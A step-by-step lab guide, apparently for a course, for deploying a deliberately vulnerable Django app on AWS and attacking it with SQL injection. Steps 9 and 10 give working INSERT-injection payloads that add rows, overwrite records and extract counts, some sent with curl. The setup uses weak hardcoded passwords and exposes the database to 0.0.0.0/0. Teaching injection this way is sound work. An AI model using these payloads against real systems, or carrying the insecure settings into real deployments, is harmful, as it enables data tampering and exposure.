# Step-by-Step Guide: SQL Injection Experiment on Ubuntu AWS Instance

## ⚠️ WARNING
This guide is for educational purposes only. The vulnerabilities created should NEVER be deployed in production environments.

## Architecture Overview (Simplified!)

```
┌─────────────────┐         ┌─────────────────┐
│   Your Browser  │────────▶│   EC2 Instance  │
│                 │         │  (Django App)   │
└─────────────────┘         └────────┬────────┘
                                     │
                                     │ Port 3306
                                     ▼
                            ┌─────────────────┐
                            │   RDS MySQL     │
                            │   (Database)    │
                            └─────────────────┘
```

**Why This Is Better:**
- ✅ No MySQL installation headaches on EC2
- ✅ No socket errors or service management
- ✅ Managed database service (AWS handles it)
- ✅ Easy to scale and backup
- ✅ Cleaner separation of concerns

## Prerequisites
- AWS Account with EC2 and RDS access
- Basic knowledge of Linux command line
- SSH client (PuTTY for Windows, Terminal for Mac/Linux)

## Step 1: Create RDS MySQL Database Instance

### 1.1 Create RDS MySQL Database (Easier and Cleaner!)
1. Log into AWS Console
2. Navigate to **RDS Dashboard**
3. Click **"Create database"**
4. Configure database:
   - **Engine:** MySQL
   - **Version:** MySQL 8.0.x
   - **Templates:** Free tier
   - **DB instance identifier:** `sql-injection-db`
   - **Master username:** `admin`
   - **Master password:** `Admin123456` (remember this!)
   - **DB instance class:** db.t3.micro (free tier) or db.t4g.micro
   - **Storage:** 20 GB gp2
   - **Public access:** **Yes** (for easy testing)
   - **VPC security group:** Create new
   - **Initial database name:** `rutasbodega`
5. Click **"Create database"**
6. Wait 5-10 minutes for database to be created

### 1.2 Configure RDS Security Group
1. Go to RDS → Databases → select your database
2. Click on the **VPC security group**
3. Edit **Inbound rules**
4. Add rule:
   - Type: MySQL/Aurora (port 3306)
   - Source: Anywhere-IPv4 (0.0.0.0/0) - **For testing only!**
5. Save rules

### 1.3 Get RDS Endpoint
1. Go to RDS → Databases → select your database
2. Copy the **Endpoint** (looks like: `sql-injection-db.xxxxx.us-east-1.rds.amazonaws.com`)
3. Save this - you'll need it later!

## Step 2: Launch Ubuntu EC2 Instance (Application Server)

### 2.1 Create EC2 Instance
1. Navigate to EC2 Dashboard
2. Click "Launch Instance"
3. Configure instance:
   - **Name:** `sql-injection-app`
   - **OS:** Ubuntu Server 22.04 LTS (Free tier eligible)
   - **Instance type:** t2.micro (free tier)
   - **Key pair:** Create new or use existing
   - **Security Group:** Create new with rules:
     - SSH (port 22) from your IP
     - HTTP (port 80) from anywhere (0.0.0.0/0)
     - Custom TCP (port 8000) from anywhere (0.0.0.0/0)
   - **Storage:** 8 GB gp2
4. Click "Launch Instance"

### 2.2 Connect to EC2 Instance
```bash
# Replace with your key file and public IP
chmod 400 your-key.pem
ssh -i your-key.pem ubuntu@your-ec2-public-ip
```

## Step 3: Update System and Install Dependencies

### 3.1 Update Ubuntu
```bash
sudo apt update
sudo apt upgrade -y
```

### 3.2 Install Required Packages (No MySQL Server Needed!)
```bash
# Install Python, Git, and MySQL CLIENT only
sudo apt install -y python3 python3-pip python3-venv git mysql-client
sudo apt install -y libmysqlclient-dev pkg-config

# Install additional tools
sudo apt install -y curl wget unzip
```

## Step 4: Configure RDS MySQL Database

### 4.1 Test Connection to RDS from EC2
```bash
# Replace RDS_ENDPOINT with your actual RDS endpoint
# Example: sql-injection-db.xxxxx.us-east-1.rds.amazonaws.com

mysql -h YOUR_RDS_ENDPOINT -u admin -p
# Enter password: Admin123456
```

**If connection works, you should see the MySQL prompt!**

### 4.2 Create Database and User in RDS
Once connected to MySQL, run these SQL commands:

```sql
-- Create database (if not created during RDS setup)
CREATE DATABASE IF NOT EXISTS rutasbodega CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;

-- Create user for Django application
CREATE USER 'django_user'@'%' IDENTIFIED BY 'django123';

-- Grant privileges
GRANT ALL PRIVILEGES ON rutasbodega.* TO 'django_user'@'%';

-- Flush privileges
FLUSH PRIVILEGES;

-- Verify setup
SHOW DATABASES;
SELECT User, Host FROM mysql.user WHERE User = 'django_user';

-- Exit MySQL
EXIT;
```

### 4.3 Test Django User Connection
```bash
# Test connection with the new Django user
mysql -h YOUR_RDS_ENDPOINT -u django_user -pdjango123 -e "USE rutasbodega; SHOW TABLES;"
```

**✅ If this works, your database is ready!**

## Step 5: Clone and Setup the Vulnerable Application

### 5.1 Clone Repository
```bash
cd /home/ubuntu
git clone https://github.com/APERTUZ47/Arquisoft.git
cd Arquisoft/casoArquisoft
```

### 5.2 Switch to Vulnerable Branch
```bash
git checkout inyeccion
```

### 5.3 Create Python Virtual Environment
```bash
python3 -m venv venv
source venv/bin/activate
```

### 5.4 Install Python Dependencies
```bash
# Install required packages
pip install --upgrade pip
pip install django==4.2.25
pip install mysql-connector-python
pip install mysqlclient
```

### 5.5 Create Requirements File (if not exists)
```bash
cat > requirements.txt << EOF
Django==4.2.25
mysql-connector-python==8.0.33
mysqlclient==2.1.1
EOF

# Install from requirements
pip install -r requirements.txt
```

## Step 6: Configure Django Application to Use RDS

### 6.1 Update Database Configuration
Edit the database configuration in `casoArquisoft/settings.py`:

```bash
nano casoArquisoft/settings.py
```

**Change the DATABASES section to use your RDS endpoint:**
```python
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'rutasbodega',
        'USER': 'django_user',
        'PASSWORD': 'django123',
        'HOST': 'YOUR_RDS_ENDPOINT',  # Replace with your actual RDS endpoint!
        'PORT': '3306',
        'OPTIONS': {
            'charset': 'utf8mb4',
        },
    }
}
```

**Example:**
```python
'HOST': 'sql-injection-db.c1234abc.us-east-1.rds.amazonaws.com',
```

### 6.2 Update ALLOWED_HOSTS
```python
# In settings.py, update ALLOWED_HOSTS
ALLOWED_HOSTS = ['*']  # For testing only - never use in production
```

### 6.3 Set Environment Variable for RDS (Optional but Recommended)
```bash
# Set DB_HOST environment variable to your RDS endpoint
export DB_HOST="YOUR_RDS_ENDPOINT"

# Make it persistent (add to ~/.bashrc)
echo 'export DB_HOST="YOUR_RDS_ENDPOINT"' >> ~/.bashrc

# Example:
# export DB_HOST="sql-injection-db.c1234abc.us-east-1.rds.amazonaws.com"
```

### 6.4 Run Django Migrations
```bash
# Make sure you're in the virtual environment and have set DB_HOST
source venv/bin/activate

# Verify connection works
python -c "import mysql.connector; print(mysql.connector.connect(host='$DB_HOST', user='django_user', password='django123', database='rutasbodega'))"

# Run migrations
python manage.py makemigrations
python manage.py migrate

# Create superuser (optional)
python manage.py createsuperuser
```

## Step 7: Initialize Database with Test Data

### 7.1 Create Initial Tables and Data
```bash
# Run the verification script to setup tables
python verificar_sistema.py

# Or manually initialize through Django shell
python manage.py shell
```

In Django shell:
```python
from consultarRutasBodega.views import crear_tablas_si_no_existen, poblar_datos_iniciales
crear_tablas_si_no_existen()
poblar_datos_iniciales()
exit()
```

### 7.2 Verify Database Setup
```bash
# Connect to RDS and verify tables
mysql -h YOUR_RDS_ENDPOINT -u django_user -pdjango123 rutasbodega -e "
SHOW TABLES;
SELECT * FROM objetos;
DESCRIBE objetos;
"
```

## Step 8: Start the Vulnerable Application

### 8.1 Run Django Development Server
```bash
# Make sure you're in the project directory and virtual environment is active
source venv/bin/activate
cd /home/ubuntu/Arquisoft/casoArquisoft

# Start server on all interfaces
python manage.py runserver 0.0.0.0:8000
```

### 8.2 Test Application Access
Open your browser and visit:
- Main app: `http://your-ec2-public-ip:8000/`
- SQL Injection demo: `http://your-ec2-public-ip:8000/sql_demo/`

## Step 9: Execute SQL Injection Tests

### 9.1 Access the Demo Page
Navigate to: `http://your-ec2-public-ip:8000/sql_demo/`

### 9.2 Test Basic Functionality
1. Insert a normal record:
   - Nombre: `laptop`
   - Descripción: `L`
   - Ubicación: `A9-B1`

### 9.3 Execute INSERT Injection Attacks

**Test 1: Multi-Record Injection**
- Nombre: `test'), ('admin', 'X', 'X1'); --`
- Descripción: `T`
- Ubicación: `A1`

**Test 2: UPDATE Attack**
- Nombre: `test2`
- Descripción: `T`
- Ubicación: `A1'); UPDATE objetos SET descripcion='HACKED' WHERE id=1; --`

**Test 3: Information Extraction**
- Nombre: `test3'), ((SELECT COUNT(*) FROM consultas_rutas), 'H', 'H1'); --`
- Descripción: `T`
- Ubicación: `A1`

### 9.4 Verify Attack Results
```bash
# Check what was actually inserted/modified in RDS
mysql -h YOUR_RDS_ENDPOINT -u django_user -pdjango123 rutasbodega -e "
SELECT * FROM objetos ORDER BY id DESC LIMIT 10;
"
```

### 9.5 Monitor Server Logs
In the terminal where Django is running, watch for the "EXECUTING DANGEROUS INSERT" messages to see the actual SQL being executed.

## Step 10: API Testing with curl

### 10.1 Test via Command Line
```bash
# Test normal insertion
curl -X POST http://localhost:8000/api/vulnerable_insert/ \
  -d "nombre=normal_test" \
  -d "descripcion=NT" \
  -d "ubicacion=A10-B1"

# Test SQL injection
curl -X POST http://localhost:8000/api/vulnerable_insert/ \
  -d "nombre=injection_test'), ('malicious', 'M', 'M1'); --" \
  -d "descripcion=IT" \
  -d "ubicacion=A11-B1"
```

## Step 11: Cleanup and Security

### 11.1 Stop the Application
Press `Ctrl+C` in the terminal running Django

### 11.2 Delete RDS Database (After Testing)
1. Go to RDS Console
2. Select your database
3. Actions → Delete
4. Uncheck "Create final snapshot" (for testing only)
5. Type `delete me` to confirm
6. Click "Delete"

### 11.3 Terminate EC2 Instance
1. Go to EC2 Console
2. Select your instance
3. Instance State → Terminate Instance

## Troubleshooting

### Common Issues and Solutions

**RDS Connection Error:**
```bash
# Test basic connectivity to RDS
telnet YOUR_RDS_ENDPOINT 3306
# or
nc -zv YOUR_RDS_ENDPOINT 3306

# Check if security group allows your EC2 instance
# Make sure RDS security group allows inbound on port 3306

# Try connecting with verbose error messages
mysql -h YOUR_RDS_ENDPOINT -u django_user -pdjango123 --verbose

# Check if RDS is publicly accessible
# Go to RDS Console → Your DB → Connectivity & security → Public accessibility should be "Yes"
```

**MySQL Client Not Installed:**
```bash
# Install MySQL client only
sudo apt update
sudo apt install -y mysql-client
```

**Django Migration Issues:**
```bash
# Reset migrations if needed
find . -path "*/migrations/*.py" -not -name "__init__.py" -delete
find . -path "*/migrations/*.pyc" -delete
python manage.py makemigrations
python manage.py migrate
```

**Port Access Issues:**
- Ensure Security Group allows port 8000
- Check if firewall is blocking: `sudo ufw status`

**Permission Denied:**
```bash
# Fix file permissions
chmod +x manage.py
chown -R ubuntu:ubuntu /home/ubuntu/Arquisoft/
```

## Educational Notes

### What You're Demonstrating
1. **Lack of Input Validation:** Direct user input into SQL
2. **String Concatenation Vulnerability:** Building SQL with user data
3. **Multiple Statement Execution:** Semicolon allowing additional commands
4. **Data Persistence:** Malicious data staying in database

### Real-World Impact
- **Data Breach:** Unauthorized data access
- **Data Corruption:** Modification of existing records
- **System Compromise:** Potential server takeover
- **Compliance Violations:** GDPR, HIPAA, SOX penalties

### Prevention Measures
1. Always use parameterized queries
2. Implement input validation and sanitization
3. Use ORM frameworks when possible
4. Apply principle of least privilege
5. Regular security audits and penetration testing

## Conclusion

This setup demonstrates how easily SQL injection vulnerabilities can be exploited when proper security measures are not in place. The key takeaway is the critical importance of using parameterized queries and proper input validation in all database interactions.

Remember: This is for educational purposes only. Never implement these vulnerabilities in production systems.
